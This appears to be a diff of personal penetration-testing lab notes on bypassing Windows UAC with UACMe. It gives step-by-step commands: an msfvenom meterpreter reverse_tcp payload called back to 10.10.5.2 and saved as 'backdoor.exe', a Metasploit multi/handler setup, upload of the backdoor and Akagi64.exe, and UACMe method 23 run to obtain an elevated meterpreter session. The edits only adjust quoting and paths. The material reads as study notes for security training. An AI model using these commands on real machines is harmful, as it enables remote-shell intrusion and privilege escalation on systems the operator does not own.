@@ -43,7 +43,7 @@ Bypassing UAC With UACMe
 - As our current user is part of administrative group we can use UAC for privilege escalation
 - now back to meterpreter sessions
 - now we need to create msfvenom paylaods so move into new tab
-- msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.5.2 LPORT= 1234 -f exe >backdoor.exe
+- msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.5.2 LPORT= 1234 -f exe > 'backdoor.exe'
 - now open msfconsole in new tab
 - use multi/handler
 - set payload windows/meterpreter/reverse_tcp
@@ -52,10 +52,10 @@ Bypassing UAC With UACMe
 - now back to previous meterpeter sessions
 - cd C:\\ [move to root folder\
 - mkdir Temp [ create Temp directory ]
-- uplaod backdoor.exe [ here backdoor.exe is msfvenom payload]
-- upload /root/Desktop/tools/UACME/Akagi64.exe [ this will upload  uacme binaries into temp folder ]
+- "uplaod backdoor.exe  ."[ here backdoor.exe is msfvenom payload]
+- "upload /root/Desktop/tools/UACME/Akagi64.exe ."[ this will upload  uacme binaries into temp folder ]
 - shell [ get a shell ]
-- .\Akagi64.exe 23 C:\Temp\backdoor.exe [ here 23 is method from github module ]
+- Akagi64.exe 23 C:\Temp\backdoor.exe [ here 23 is method from github module, we need to give full path for backdoor.exe ]
 - this will give us new meterpreter session in multi/handler
 - getprivs  [ this will give us all the privileges it has ]
 - ps [ list all the processes ]
